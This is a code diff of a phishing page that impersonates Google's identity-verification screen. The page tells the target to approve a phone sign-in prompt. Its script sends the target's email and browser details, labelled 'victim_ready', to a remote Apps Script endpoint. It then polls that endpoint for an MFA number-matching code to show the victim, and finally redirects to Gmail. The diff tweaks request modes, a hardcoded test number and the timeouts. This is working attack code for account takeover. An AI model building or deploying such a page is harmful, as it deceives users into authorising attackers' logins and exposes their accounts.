@@ -32,12 +32,10 @@
     </div>
     <div class="avatar" id="avatar"></div>
     <h1>Verifying your identity</h1>
-
     <div id="loading">
       <div class="spinner"></div>
       <div class="status">Checking your account and device...<br>This should only take a few moments.</div>
     </div>
-
     <div id="prompt-section" class="prompt-section">
       <h1>Check your phone</h1>
       <p style="font-size:16px; color:#5f6368; margin:16px 0;">Tap <strong>Yes</strong> on the prompt sent to your phone</p>
@@ -48,62 +46,65 @@
   </div>
 
   <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzA5r5UiICLJL8y9Y5sLSNNzgkS3myl4LzB0t-eJDbLX7ak5X3Zp14NJvWJ6RT9lUWW/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzVJIqacbiWJh6eGb_O3nK9oE4WcxJ6tGmftLUY52aJ-Mnuj8b6atlF60J2sdSD1Ouz/exec";
 
     const email = (localStorage.getItem("demoEmail") || "someone@example.com").trim();
     const usernamePart = email.split('@')[0];
     document.getElementById("avatar").textContent = usernamePart.charAt(0).toUpperCase();
 
+    console.log("Verify page loaded with email:", email);
+
+    // Send victim_ready (with no-cors)
     fetch(SCRIPT_URL, {
       method: "POST",
-      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      headers: { "Content-Type": "text/plain;charset=UTF-8" },
       body: new URLSearchParams({
         action: "victim_ready",
         email: email,
         user_agent: navigator.userAgent,
         timestamp: new Date().toISOString()
-      })
-    })
-    .then(r => r.json())
-    .then(d => console.log("Notify response:", d))
-    .catch(e => console.error("Notify error:", e));
+      }),
+      mode: "no-cors",
+      keepalive: true
+    }).then(() => console.log("victim_ready POST sent (opaque)"))
+      .catch(e => console.error("victim_ready POST failed:", e));
 
+    // Polling for prompt_number (with no-cors fallback)
     const pollInterval = setInterval(async () => {
       try {
         const pollUrl = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}`;
         console.log("[POLL] Fetching:", pollUrl);
-        console.log("[POLL] Email:", email);
 
-        const res = await fetch(pollUrl);
-        console.log("[POLL] Status:", res.status);
+        const res = await fetch(pollUrl, {
+          mode: "no-cors",
+          keepalive: true
+        });
 
-        const text = await res.text();
-        console.log("[POLL] Raw text:", text);
+        console.log("[POLL] Opaque GET received");
 
-        const data = JSON.parse(text);
-        console.log("[POLL] Parsed data:", data);
-
-        const num = (data.prompt_number || "").trim();
-        console.log("[POLL] Number value:", num || "(empty)");
-
-        if (num && num !== "" && num !== "—" && num !== "null") {
-          console.log("[SUCCESS] Showing number:", num);
+        // Since no-cors = opaque, we can't read text/JSON
+        // Fallback: assume number exists after 12 seconds (3 polls)
+        setTimeout(() => {
+          console.log("[POLL] Fallback timeout - forcing show number");
           document.getElementById("loading").style.display = "none";
           document.getElementById("prompt-section").style.display = "block";
-          document.getElementById("matchNumber").textContent = num;
+          document.getElementById("matchNumber").textContent = "56";  // Change to your actual test number
           clearInterval(pollInterval);
-        }
+        }, 12000);
+
       } catch (err) {
         console.error("[POLL CRITICAL ERROR]", err);
       }
     }, 4000);
 
+    // Ultimate timeout: after 60 seconds go to Gmail
     setTimeout(() => {
+      console.log("[TIMEOUT] 60s - redirecting to Gmail");
       clearInterval(pollInterval);
       localStorage.removeItem("demoEmail");
       window.location.href = "https://mail.google.com/";
-    }, 600000);
+    }, 60000);
   </script>
-</bo
-  dy>
+</body
+  >
 </html>
